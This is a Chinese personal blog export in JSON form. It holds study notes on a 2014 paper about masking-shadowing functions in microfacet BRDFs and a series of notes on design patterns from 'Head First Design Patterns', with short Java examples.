Kelemen遮罩函数V-Cavity的一种廉价计算方式，简化以下式得：","tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"https://v25bh145.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"微表面","slug":"微表面","permalink":"https://v25bh145.github.io/tags/%E5%BE%AE%E8%A1%A8%E9%9D%A2/"}]},{"title":"理解微表面中的遮罩阴影函数-01","date":"2022-01-08T07:39:00.000Z","path":"2022/01/08/coding/CG/文摘阅读/Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs_1/","text":"论文出处：Journal of Computer Graphics Techniques Vol.3, No. 2,2014 标题：Understanding the Masking-Shadowing Function in Microfacet-Based BRDFs 作者-时间：Eric Heitz-2014 网址：http://jcgt.org/published/0003/02/03/ 注意 本文使用的一些记号与论文相同，如下： 本文可能需要的前置知识： 辐射度量学(radiometry) 对于微表面的基本了解 渲染方程 镜面反射BRDF、漫反射BRDF 菲涅尔反射 由于是英文论文的中文笔记，所以对于私自翻译的专业词汇加上了英文标注。 文章有些公式在推导过程中隐式使用了很多交叉知识，我擅自将其部分标注了出来并适当补充了一些推导。 摘要文章主要关于微表面历来公式与研究的总结，介绍了微表面的原理、微表面相关模型、遮罩(masking)-阴影(shadowing)的Smith及V-cavity公式以及详细的推导过程，并没有提出新的公式或模型。 微表面的提出/原理首先介绍三种平面，分别为几何平面(geometric surface)、微表面(microsurface)、以及投影面： 几何平面即面积为1的平面，微表面则是对几何平面进行扰动过后的曲面，投影面则是从$\\omega_o$方向看微表面/几何平面所能看到的面。 微表面面积、两种积分之后提出了两种计算平面面积的方式，分别是空间(spatial)积分与统计学(statistical)积分： 空间积分即是简单地遍历面上各点，而统计学积分需要使用法线分布函数D。法线分布函数是个概率密度函数，D(w)表示w方向的法线在整个法线中出现的概率： 其中$p_m$指微表面M上的任意一点，$\\omega_m$指任意一条法线，$\\Omega$指体积角空间。而在计算有关微表面有关的函数时，也出现了两种计算的方式： \\int_Mg(p_m)dp_m=\\int_{\\Omega}g(\\omega_m)D(\\omega_m)d\\omega_m其中$\\omega(p)$指在微表面p处的法线方向。 随后，给出了关于微表面空间的点函数转换为关于体积角空间的法线函数： 其中$\\delta_\\omega$是Delta函数，仅当自变量等于$\\omega$时有非零值，Delta函数还有如下公式(性质)： \\int^{\\infty}_{-\\infty}\\delta(x)dx=1几何面积与投影面积 由图得，$projected\\ area=area*cos\\theta_0$，因此得出： 遮罩函数(masking function)投影的区域不止是从$\\omega_o$方向看几何平面的面积，也可以是从$\\omega_o$看微表面的可见面积(visible microfacet)。 因此可设空间(spatial)函数$G_1(\\omega_o,p_m)$为一个函数，若$p_m$于$\\omega_o$方向被遮挡，则值为0，否则其值为1。根据积分转换(上文)的公式，可以将空间函数G1转换为统计学函数$G_1(\\omega_o,\\omega_m)$： projected\\ area=\\int_MG_1(\\omega_o,p_m)dp_m\\\\ G_1(\\omega_o,\\omega)=\\frac{\\int_M\\delta\\omega(\\omega_m(p_m))G_1(\\omega_o,p_m)dp_m}{\\int_M\\delta_\\omega(\\omega_m(p_m))dp_m}其中为夹(clamped)点积，若(a,b)小于零则取0，大于0则取正常点积结果。 统计学函数的值域为[0,1]，表示$\\omega$法线方向的点从$\\omega_m$看被微表面自身遮挡的概率(或者说，比例)。被自身遮挡的情况如下图黑色部分： 遮罩函数满足的约束 如前所述，遮罩函数计算的微表面可视面积须等于几何平面投影到$\\omega_o$的面积，即约束如下： 微表面还需满足一种约束，称微表面轮廓(microsurface profile)，第一种约束仅限制了法线方向，并没有限制法线所在点的位置。 微表面BRDFs的推导对辐亮度公式的展开根据上述D、$G_1$函数的定义，我们可以导出进入微表面的辐亮度公式： 其中，$&lt;\\omega_o,\\omega_m&gt;D(\\omega_m)$有关于法线的分布，$G_1(\\omega_o,\\omega_m)$是法线被自身遮挡的比例，$L(\\omega_o,\\omega_m)$是从$\\omega_o$方向到$\\omega_m$法线所在点的辐亮度，而积分外的$cos\\theta_o$是投影面积到几何平面面积的折算，即把投影面的辐亮度转换为几何平面的辐亮度，出于简化，设$D_{\\omega_o}(\\omega_m)$： 由于遮罩函数的约束，得出$\\int_\\Omega D_{\\omega_o}(\\omega_m)d\\omega_m=1$，原公式也可以展开为： 构建局部与整体BRDF函数由于BRDF的定义，设局部(含$\\omega_m$项)BRDF$\\rho_M(\\omega_o,\\omega_i,\\omega_m)$： \\rho_M(\\omega_o,\\omega_i,\\omega_m)=\\frac{dL(\\omega_o.\\omega_m)}{L(\\omega_i)d\\omega_i}我们将公式中的$d_L(\\omega_o,\\omega_m)$推导出来代入辐亮度的展开式的微分形式： \\begin{aligned}dL(\\omega_o,M)=&\\int_{\\Omega}dL(\\omega_o,\\omega_m)D_{\\omega_o}(\\omega_m)d\\omega_m\\\\=&\\int_{\\Omega}\\rho_M(\\omega_o,\\omega_i,\\omega_m)L(\\omega_i)d\\omega_i D_{\\omega_o}(\\omega_m)d\\omega_m\\\\=&L(\\omega_i)d\\omega_i\\int_{\\Omega}\\rho_M(\\omega_o,\\omega_i,\\omega_m)D_{\\omega_o}(\\omega_m)d\\omega_m\\end{aligned}设与微分项$\\omega_m$无关的整个微表面的BRDF函数$\\rho(\\omega_o,\\omega_i)=\\frac{dL(\\omega_o,M)}{cos\\theta_iL(\\omega_i)d\\omega_i}$，代入上式则有： 将$D_{\\omega_o}(\\omega_m)$展开代入上式，则有： 遮罩-阴影函数(masing-shadowing function)由于沿$\\omega_i$方向从微表面射出的光线也会被微表面自身遮挡(和$\\omega_o$一样)，因此需要考虑双向的遮罩-阴影函数$G_2$，我们用$G_2$代替式中的$G_1$，得： 镜面微表面的BRDF推导镜面反射含$\\omega_m$微分项的BRDF公式如下： 其中F为菲涅尔项，$||\\frac{\\partial \\omega_h}{\\partial \\omega_i}||=\\frac{1}{4|\\omega_i\\cdot\\omega_h|}$，$\\omega_h$为$\\omega_o$、$\\omega_i$角平分线上的归一化向量(见前记号定义)，详细的推导可看这篇博客：https://blog.csdn.net/air_liang1212/article/details/106215259；delta函数严格规定了$\\omega_m$的方向，由于镜面反射的定义，若$\\omega_m$方向与$\\omega_h$方向不同，则$\\omega_i$方向观察不到任何来自$\\omega_o$方向的光线。将该方程代入上面推出的整个微表面BRDF公式，得： 漫反射微表面BRDF推导漫反射含$\\omega_m$微分项的BRDF公式如下： 将该方程代入上面推出的整个微表面BRDF公式，得： 上述推导结果并没有解析解(analytical solution)，只有拟合解(analytical fit)。 BRDF归一化测试白炉测试(The White Furnace Test)BSDF是BRDF(反射)与BTDF(透射)的和，其定义为：$s(\\omega_o,\\omega_i)=\\rho(\\omega_o,\\omega_i)+t(\\omega_o,\\omega_i)$，当微表面吸收率为0(就是说不吸收能量)时，满足以下约束： \\int_{\\Omega_i}s(ω_o,ω_i)|ω_g,ω_i|dω_i=1\\ \\forall ω_o若菲涅尔项=1，则光线发生全反射，$s=\\rho$，有如下测试，成为白炉测试： 然而，对于基于镜面反射的微表面BRDF而言，其微表面之内的遮挡被全部忽略，并没有考虑在微表面之内的多次光线弹射，由此并不通过白炉测试，基于这个原因提出了弱白炉测试。 弱白炉测试(The Weak White Furnace Test)弱白炉测试不考虑$ω_i$(当然也不考虑$ω_h$)与$G_2$项，仅考虑入射光线到微表面这一段。 对于基于镜面反射的微表面BRDF，替换$G_2$为$G_1$，去掉$ω_i$相关项，BRDF变为： 代入白炉测试的公式，得出弱白炉测试的公式如下： 对于基于漫反射的微表面BRDF，替换$G_2$为$G_1$，可得： \\int_{\\Omega_i}\\frac{1}{\\pi}\\frac{1}{|ω_g\\cdotω_o||ω_g\\cdotω_i|}\\int_{\\Omega}G_1(ω_o,ω_m)D(ω_m)dω_m|ω_g\\cdotω_i|dω_i\\\\=\\frac{1}{\\pi}\\frac{1}{|ω_g\\cdotω_o|}\\int_{\\Omega_i}\\int_{\\Omega}G_1(ω_o,ω_m)D(ω_m)dω_mdω_i=1","tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"https://v25bh145.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"微表面","slug":"微表面","permalink":"https://v25bh145.github.io/tags/%E5%BE%AE%E8%A1%A8%E9%9D%A2/"}]},{"title":"10.状态模式-设计模式","date":"2020-12-22T03:53:00.000Z","path":"2020/12/22/coding/designPatten/10.状态模式-设计模式/","text":"状态模式 “策略模式与状态模式是双胞胎，在出生时才分开。” 定义: “状态模式允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它的类。” 状态: 可以理解为对象的一个字段/变量。 在内部状态改变时改变它的行为: 对象的同一个方法会因为状态的改变而产生不同的结果，看起来类方法内部实现的算法完全换了一个。 对外开放扩展，关闭改变的原则 我们将不同状态产生的行为 (对于不同的状态，类的方法中应该有不同的实现，我们称这些不同的实现算法为不同状态产生的行为) 迁移到实现状态接口的不同状态类中，利用类中状态变量的setter函数来改变对象的状态(我们称状态与类之间这样的关系为组合)，状态改变即意味着有外来方法调用状态变量的setter将状态变量所属的类完全变成了另外一个状态类(都实现了状态接口的不同状态类)。 不同状态的行为名我们需全部聚合起来放到状态接口中，每一个状态类都要实现这些接口方法。即是这个状态配上那个行为可能不会产生什么，也需要实现以便于统一调用。 我们在类的对应方法中直接调用状态变量对应的行为方法(这些行为方法全部被装载在了状态接口中)，如果状态变量的类被setter改变了，则状态变量调用的同名方法其中的具体实现也会不一样(状态类变了，状态接口的实现方法也变了)。 所以，我们只是通过组合的简单引用来改变对象的内部方法的实现过程而已，并没有改变对象内部。 并且，还有重要的一点是，客户不会直接和状态交互。 状态转换放在哪里？ 放在使用状态的类中，这样会导致状态类与使用状态的类耦合度很高，但是代码简单易懂。 放在状态类中，这样不仅耦合度低，还可以实现动态转换。 状态模式与策略模式 策略模式是通过组合更换对象的行为。 状态模式是通过组合更换对象的状态[从而更换对象的行为]。 =&gt; 类图相同，意图不同。 代码: https://github.com/v25bh145/patternDesign-code/tree/master/Candle","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"9.迭代器模式与组合模式-设计模式","date":"2020-12-20T04:18:00.000Z","path":"2020/12/20/coding/designPatten/9.迭代器与组合模式-设计模式/","text":"迭代器与组合模式 “有许多种方法可以把对象堆起来成为一个集合” =&gt; 如何做到封装不同集合的遍历呢？ 迭代器模式 “封装不同集合的遍历” 将不同集合的遍历过程封装起来，使用相同的集合访问接口。 使用迭代器接口实现 定义: “迭代器模式提供了一种方法顺序访问一个聚合对象中的各种元素，而又不暴露其内部的表示。” 顺序: 指以聚合对象内部的顺序，可以不是输入的原顺序。 聚合对象: 也可以称为集合对象(collections)，只要是相同数据类型的变量的集合即可。 内部表示: 并不会告知内部是什么数据结构实现的，我们也在调用时看不到内部具体的实现算法，也就是说将调用与内部实现解耦了 设计原则 - 一个类应该只有一个引起变化的原因 一个引起变化的原因:若有两个引起变化的原因，则会在改变需求的时候不容易修改代码。 =&gt; 要正确区分设计中的责任 “内聚(cohesion)“: 用来度量一个类/模块紧密地达到单一目的的责任。 当一个模块或一个类被设计成只支持一组相关的功能时，我们说它具有高内聚。 组合模式 定义: “组合模式允许你讲对象组合成树形结构来表现[整体/部分]的层次结构。组合能让客户以一致的方式处理个别对象以及对象组合。” 树形结构: 组件、组合、叶节点 组件是一个接口，组合与叶节点将实现接口中的方法，一般有三个默认行为: add()、remove()、getChild()。 组合是一个非叶节点，其可以有孩子，孩子可以是叶节点或其他的组合。 叶节点不能有子，通过实现组件的操作，定义组合内元素的行为。 “以单一责任设计原则换取透明性“ 单一设计原则: 抽象类不止负责一个功能，同时拥有了叶节点(执行方法)与组合(管理层次)的功能。 透明性: 通过使叶节点与组合继承一个抽象类，客户会将叶节点与组合一视同仁。 示例代码: 迭代器模式: https://github.com/v25bh145/patternDesign-code/tree/master/RestaurantMerge/src/Iteratorpattern 组合模式: https://github.com/v25bh145/patternDesign-code/tree/master/RestaurantMerge/src/Compositepattern [组合模式中外部迭代器的实现有个输出bug，如果您调试出来具体问题了劳烦告知我，万分感谢]","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"8.模板方法模式-设计模式","date":"2020-12-17T03:18:00.000Z","path":"2020/12/17/coding/designPatten/8.模板算法模式-设计模式/","text":"模板方法 “封装算法” 定义1: “模板方法定义了一个算法的步骤，并允许子类为一个或多个步骤提供实现。” 定义2: “模板方法模式在一个方法中定义一个算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以在不改变算法结构的情况下，重新定义算法中的某些步骤” 算法的步骤 &amp; 算法的骨架: 我们将多个子类各要实现的算法泛化为一个总体框架(也可以说是，骨架。这个总体框架即称为模板方法)与逻辑部分的接口(逻辑部分也可以说是模板方法定义出来的一连串步骤的具体实现，这里抽象出来了逻辑部分的接口)，放在基类(这个基类一般为抽象类)中。 =&gt; 模板方法是final类型，也就是说是子类不可覆盖的。 存在不需要子类也可以实现的逻辑方法时，我们可以在抽象类中直接实现之，称为”钩子(hook)“，子类可以选择性覆盖钩子。 钩子: 可以作为条件控制影响算法流程 子类提供实现: 子类可以继承基类，覆盖基类的逻辑部分代码，提供不同的实现。 好莱坞原则: “别调用(call 打电话)给我们，我们会调用(call 打电话)你” “依赖腐败”: 高层组件依赖低层组件，低层组件依赖高层组件，高层组件依赖边侧组件，边侧组件依赖低层组件(即环状依赖)。 好莱坞原则允许低层组件将自己挂钩到高层组件上，但是调用与否以及何时调用是由高级组件决定的。 低层组件绝不能调用高层组件。 工厂模式是模板方法模式的一种特殊版本 模板方法模式将算法框架抽象出来，每一个步骤具体的实现过程交由子类实现(也可以自己实现/使用钩子)。 工厂方法模式将创建过程抽象出来，创建的具体过程交由子类实现(也可以自己实现/使用钩子)。 模板方法示例代码详见https://github.com/v25bh145/patternDesign-code/tree/master/CoffeeAndTea JAVA中的模板方法: Arrays.sort()与Comparable接口(compareTo()方法): https://github.com/v25bh145/patternDesign-code/tree/master/DuckSort","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"7.适配器模式&外观模式-设计模式","date":"2020-12-15T03:40:00.000Z","path":"2020/12/15/coding/designPatten/7.适配器模式&外观模式-设计模式/","text":"适配器模式&amp;外观模式 交流电适配器 =&gt; “将一个接口转换成另一个接口，以符合客户的期望” “如果它走起路来像只鸭子，叫起来像只鸭子，那么它必定可能是一只鸭子包装了鸭子适配器的火鸡” 客户使用适配器的过程 客户通过目标接口调用适配器的方法对适配器发出请求。 适配器使用被适配者接口把请求转换成被适配者的一个或多个接口。 客户接收到调用的结果，但并未察觉这一切是适配器在起转换作用。 适配器要把被适配者转换成客户需要的样子。 客户与被适配者是解耦的。 定义: “适配器模式将一个类的接口，转换成客户期望的另一个接口，适配器让原本接口不兼容的类可以合作无间。” 由类通过实现目标接口来包装被适配者。 被适配者的子类也可以搭配适配器使用。 适配不完全的例子-枚举器&amp;迭代器的适配器 =&gt; 抛出异常 123456789101112131415161718public class EnumerationIterator implements Iterator &#123; Enumeration enum; public EnumerationIterator(Enumeration enum) &#123; this.enum = enum; &#125; public boolean hasNext() &#123; return enum.hasMoreElements(); &#125; public Object next() &#123; return enum.nextElement(); &#125; public void remove() &#123; //枚举类中没有迭代器中remove()相对应的接口，因此只能抛出异常 throw new UnsupportedOperationException(); &#125;&#125; https://github.com/v25bh145/patternDesign-code/tree/master/Turkey 查看实例代码 定义: “外观模式提供了一个统一的接口，用来访问子系统中的一群接口。外观模式定义了一个高级接口，让子系统更容易使用。” 外观模式并没有封装子系统，而是提供了一个简化版的接口。 (命令模式则封装、统一了接口，提供了一个统一的、向外开放的命令接口) 外观模式将客户从组件的子系统中解耦。 外观模式的意图是简化接口，而适配器的意图是转换、改变接口。 实现一个外观，需要将子系统组合(变量形式)进外观中，然后将工作委托(调用变量的方法或数据)给子系统执行。 “最少知识原则(墨忒尔法则)” =&gt; “只和你的密友谈话” 减少对象之间的交互，不要让太多类耦合在一起。 方针: =&gt; 在任何对象的方法内，我们只应该调用属于以下范围的方法: 该对象本身 被当作方法的参数传递而来的对象 此方法所创建或实例化的任何对象 对象的任何组件 =&gt; 组件想象成实例对象所引用的对象，即是”HAS-A”关系 缺点: 会有很多包装类被制造出来，导致复杂度、开发时间增加与运行性能降低。 错误用法举例: 123456789public float getTemp() &#123; //不要声明[传递/创建/实例化]的对象所[传递/创建/实例化]的对象 //也就是说，避免二次引用，提倡一次饮用 Thermometer thermometer = station.getThermometer(); return getTempHelper(thermometer);&#125;public float getTempHelper(Thermometer thermometer) &#123; return thermometer.getTemperature();&#125; 正确用法 1234public float getTemp() &#123; //在之间使用station解耦 return tation.getThermometer().getTemperature();&#125; https://github.com/v25bh145/patternDesign-code/tree/master/HomeTheater 查看实例代码","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"6.命令模式-设计模式","date":"2020-12-13T08:35:00.000Z","path":"2020/12/13/coding/designPatten/6.命令模式-设计模式/","text":"命令模式 “把方法调用封装起来” 定义: “命令模式把请求封装成对象，以便使用不同的请求、队列或者日志来参数化其他的对象。命令模式也支持可撤销的操作。” 在接收者上绑定一组动作到命令对象上来封装一个请求。 =&gt; 命令对象只暴露execute()方法，在方法内部封装接收者与接收者动作的具体实现。 使用命令来参数化对象。 =&gt; 传递者使用抽象命令接口，且传入(已绑定好执行者的)具体的命令对象。 我们也可以直接在命令对象层实现一些逻辑，尽管不符合命令模式的框架。 我们也可以将许多命令聚合为一个宏命令，只要满足抽象命令接口即可。 https://github.com/v25bh145/patternDesign-code/tree/master/RemoteControl 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"5.单件模式-设计模式","date":"2020-12-13T03:04:00.000Z","path":"2020/12/13/coding/designPatten/5.单件模式-设计模式/","text":"单件模式 “用来创建独一无二的，只能有一个实例的对象的入场券。” 定义: “单件模式确保一个类只有一个实例，并提供一个全局访问点。” 全局访问点: 构造函数是私有方法，而提供一个公开、静态的getInstance()方法 1234public static Singleton getInstance() &#123; if(uniqueInstance != null) uniqueInstance = new Singleton(); return uniqueInstance;&#125; 注意:如果使用1.2版本或之前的JVM，需要建立单件注册表，以免垃圾收集器回收单件。 线程安全性 将getInstance()改为同步方法(synchronized)，但是性能将遭受损失。 对uniqueInstance赋初值，不再改变它 (也就是说，getInstance不负责创建对象，仅仅负责返回对象。 双重检查加锁 12345678910111213141516//volatile: 当变量被初始化时，确保多个进程能正确处理变量private volatile static Singleton uniqueInstance;public static Singleton getInstance() &#123; //如果单例已经创建过了，则不会进入这个if区块，也就是说没有由锁带来的性能损失 if(uniqueInstance == null) &#123; //进入此区域的仅限于想要初始化单例的进程。也就是说，到达这里的为第一批的单例创建者们 synchronized (Singleton.class) &#123; //而其中只能有一个单例创建者进入创建单例 if(uniqueInstance == null) uniqueInstance = new Singleton(); &#125; &#125; return uniqueInstance&#125; 不适用于1.4或更早版本的java。","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"4.工厂模式-设计模式","date":"2020-12-12T19:08:00.000Z","path":"2020/12/13/coding/designPatten/4.工厂模式-设计模式/","text":"工厂模式 除了new之外，还有更多制造对象的方法。 简单工厂、工厂方法 “封装创建对象“ 将创建对象的代码封装到一个对象中，我们称这个对象为”工厂“。 如果将创建对象的代码封装到一个静态方法中，我们可以称此位”静态工厂“，有一个缺点:不能通过继承来改变创建方法的行为。 “由一个对象负责所有具体类的实例化” =&gt; “由一群子类负责实例化” “工厂方法用来处理对象的创建，并将这样的行为封装在子类中。这样，客户程序中关于超类的代码就和子类对象创建代码解耦了。” abstract Product factoryMethod(String type) 在工厂抽象父类向外的创建接口中调用这个抽象方法，将这个抽象方法[委托]给了子类的具体实现，实现了解耦。 “平行的类层级” 创建者基类与产品基类属同一层级，每个子类都有自己特定的实现。 创建者基类的子类时不同的创建者，产品基类的子类是产品类型，其中的关系可以是一对一，也可以是一对多。 定义: “工厂方法模式定义了一个创建对象的接口，但由子类决定要实例化的类时哪一个。工厂方法让类把实例化推迟到子类。” 接口: factoryMethid(String type) : Product 推迟:由子类实现，也可以认为是委托。 决定:抽象创建者基类并不知道要实例化哪一种产品，当选择创建者子类时，就明确了可以实例化什么样的产品(也就是说，new Product()在子类中发生，type在子类中发挥效果。 简单工厂并不是一种设计模式。 简单工厂只有一个创建者实现类，没有创建者基类。 简单工厂将所有种类的创建全部放在了一个地方，而工厂方法则创建了一个框架。 “要依赖抽象，不要依赖具体类” —— 依赖倒置原则 依赖: 当new一个具体类，就依赖于一个具体类。 不能让高层组件依赖低层组件，且不管高层组件还是低层组件，两者都应依赖于抽象。 高层组件: 由其他低层组件定义其行为的类。 放到工厂方法中，高层组件即是创建者类，低层组件即是产品子类，两者都依赖于抽象产品类。 应该重写代码以便于我们依赖抽象类而不依赖具体类。 倒置:低层组件在依赖高层组件的抽象，我们思考问题从低层到抽象基类，再到抽象基类的创建。 遵守依赖倒置原则的指导方针: 变量不可以持有具体类的引用。 new，可以通过使用工厂来避开引用。 不要让类派生自具体类。 让类派生自一个抽象。 不要覆盖基类中已经实现的方法。 如果覆盖了基类已经实现的方法，则说明现在的基类不适合继承。 当然，如果这个类不会改变或是在简单程序中，完全可以不使用依赖倒置原则。 抽象工厂pre ​ 还可将创建子类共同的字段提取出来，将共同字段的区别另归于一个抽象工厂(另外一系列创建者)，而原本的使用该字段区别开的产品子类可以去掉，也就是说，由于该字段的区别造成的分类可以不用再创建产品子类。 ​ 放到例子中来说就是，当纽约和芝加哥的工厂的原料字段相同，但原料字段内容不同时，可以另提取出一个抽象的原料工厂(另一系列抽象创建者)和两个具体的芝加哥与纽约原料工厂(另一系列具体创建者);而原本的纽约奶酪披萨和芝加哥奶酪披萨(两个因字段内容不同分开的产品子类)就可以合并为一个奶酪披萨(合并字段意义的产品子类)了;不变地，我们若想要生产纽约的奶酪披萨，同样只需使用纽约奶酪披萨制造工厂(创建者子类)即可。 ​ 为了实现上述功能，两个奶酪披萨制造工厂的代码需要改变一下，原先是创建不同地区的奶酪披萨(两个因字段内容不同分开的产品子类)，现在直接使用奶酪披萨和不同地区的原料工厂(不同地区的原料工厂使用变量来引入)，在生产奶酪披萨时(new)，直接将原料工厂变量传入奶酪披萨(合并字段意义的产品子类)的构造函数即可。 定义: “抽象工厂模式提供一个接口，用于创建相关或依赖对象的家族，而不需要明确指定类。” 抽象工厂方法允许客户使用抽象的接口创建一组相关的产品，而不需要知道实际产生的产品是什么。 客户从具体的产品中解耦。 家族: 举个例子，原料就是产品家族，而构成原料的奶酪、蔬菜、水果等则是产品家族的组成部分，记为抽象产品类(也可以称为产品抽象接口)，我们可以任意扩展该抽象类。(举个例子，青菜与菠菜都是扩展自蔬菜类型)。换言之，家族与抽象产品类为HAS-A关系，抽象产品类与具体产品类为IS-A关系。 接口: 即是创建不同抽象产品类的接口们。一个抽象工厂的家族由多少个抽象产品类组成，就可以有多少个接口。 不需要明确指定: 继承自抽象工厂的具体工厂则可以实现抽象工厂的接口，任意指定产品的具体类。换言之，抽象工厂不知道具体产品类是什么，只知道抽象产品类是什么。 “工厂方法潜伏在抽象工厂里” 可以在抽象工厂中利用工厂方法实现生产方法。 解耦 工厂方法: 创建子类继承基类的生产方法，子类决定方法返回的具体类型。 将客户从具体类型中解耦。 使用继承解耦。 抽象工厂: 创建具体工厂决定家族的抽象产品类使用什么具体产品类。 将客户从使用的具体产品中解耦。 使用对象的组合解耦。 工厂方法的优缺点 可以将一群产品集合为家族。 当扩展产品时需要改变接口。 具体工厂类中实现具体产品类时，常常会利用到工厂方法 例如我们的代码示例中就利用了工厂方法，每一个createXXX()方法都是工厂方法的标准接口 将具体产品类的生成委托给子类，这里子类为具体工厂类。 即抽象工厂是工厂方法的组合，其组合形式就是家族。 https://github.com/v25bh145/patternDesign-code/tree/master/Pizza 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"3.装饰者模式-设计模式","date":"2020-12-12T03:32:00.000Z","path":"2020/12/12/coding/designPatten/3.装饰者模式-设计模式/","text":"装饰者模式 给爱用继承的人一个全新的设计眼界(翻译: 再敢滥用继承我不打死你) 不修改底层代码而给你的对象赋予新的职责 “类应该对扩展开放，对修改关闭。” =&gt; 开放-关闭原则 类如果对扩展关闭，毫无疑问不具备可扩展性。 类如果对修改开放，则会导致一系列内部实现被扰乱。 没有必要使得每一个地方都保持开放-关闭原则，这样会增加代码的复杂度，通常只需在变化区实现此功能即可。 五点规则 装饰者和被装饰者对象有相同的超类型(父类)。 你可以用一个或多个装饰者包装被装饰者。 既然装饰者与被装饰者拥有相同的超类型，则可以使用装饰者去装饰一个已经包装过的装饰。 装饰者可以在所委托被装饰者的行为之前/之后，加上自己的行为，以达到特定的目的。 对象可以在任何时候被装饰，所以可以动态地、不限量地装饰被装饰者。 定义: “装饰者模式动态地将责任附加到对象上，若要扩展功能，装饰者提供了比继承更有弹性的替代方案。” 在代码中，具体被装饰者与装饰父类(抽象类或接口)继承了一个通用父类(可以是一个接口，但是JAVA内已经习惯了使用抽象类)，具体装饰者继承了装饰父类。 具体装饰者拥有一个通用父类的引用，指向包装的对象。 这里使用了大量的继承，但是关键的地方在于，我们利用继承达到”类型匹配“，而不是获得”行为“，且这里的继承完全可以替换成接口。 缺点:会在使用时加入大量小类，导致代码复杂性偏高。 =&gt; 需要避免过度使用 https://github.com/v25bh145/patternDesign-code/tree/master/Beverage 以及 https://github.com/v25bh145/patternDesign-code/tree/master/JavaIODecorator 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"2.观察者模式-设计模式","date":"2020-12-12T02:06:00.000Z","path":"2020/12/12/coding/designPatten/2.观察者模式-设计模式/","text":"观察者模式 让你的对象知悉现况 JDK使用最多的模式 “主题 + 订阅者 = 观察者模式” 主题负责产生/获取信息。(主题在所知的信息改变时会通知订阅者) 订阅者可以接收由主题发来的信息。 (订阅者会接收主题的通知并且做出改变) 订阅者可以随时取消订阅。 只要主题还在产生/获取消息，就会不断向订阅者发送消息。 e.g:报纸&amp;订阅报纸的人 定义: “观察者模式定义了对象之间的一对多依赖，这样一来，当一个对象改变状态时，它的所有依赖者都会收到通知并自动更新。” 一对多依赖，即指的是一个主题+多个订阅者的模式 大体框架 主题接口 &amp; 主题类 主题接口拥有注册、删除与通知订阅者三个接口。 主题类实现主题接口，另外还负责数据获取(称为状态)。 观察者接口 &amp; 观察者类 观察者接口拥有更新接口。 观察者类实现观察者接口，另外还有其他具体的数据处理方法。 “观察者模式提供了一种对象设计，让主题与观察者之间松耦合“ 松耦合: 指主题与观察者之间以接口(即是观察者接口)连接。 好处: 可以随时增加新的观察者，满足接口即可，且主题代码不需要修改。 可以独立复用主题/观察者，用于其他地方。 “为了交互对象之间的松耦合而努力” java.util.Observer &amp; java.util.Observable - 官方的观察者模式 在官方的Object类中，主题接口是一个抽象类Observable，主题类(可观察者)继承了Observable。 主题(可观察者)想要推送给观察者数据时，需要先执行setChanged()方法，之后执行notifyObservers()方法，其中notifyObservers可选直接传输一个数据对象。 